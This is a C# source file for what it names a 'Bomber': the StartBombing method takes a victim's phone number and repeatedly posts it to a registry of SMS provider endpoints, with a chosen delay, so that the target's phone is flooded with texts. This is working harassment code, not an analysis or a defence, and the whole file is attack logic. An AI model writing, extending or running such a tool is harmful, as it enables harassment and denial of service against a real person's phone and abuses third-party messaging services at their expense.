using System.Collections.Generic;
using System.Net.Http;
using System;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;

namespace xv1Bomb
{
    public class Bomber
    {
        public async Task StartBombing(string phoneNumber,CancellationToken ct ,int repeat,int delay)
        {
            HttpClient client = new HttpClient();

            for (int i = 0;i<repeat;i++) {
                foreach (var site in smsProviderRegistry.smsProviders)
                {
                    if (!ct.IsCancellationRequested)
                    {
                        var json = site.json.Replace("@",phoneNumber);
                        var content = new FormUrlEncodedContent(JsonConvert.DeserializeObject<Dictionary<string,string>>(json));
                        var resp = await client.PostAsync(site.link, content);
                        
                        Console.ForegroundColor = ConsoleColor.DarkMagenta;
                        Console.WriteLine(site.link);
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine(resp.ToString());

                        Thread.Sleep(delay);
                    } else break;
                }
            }
        }
    }
}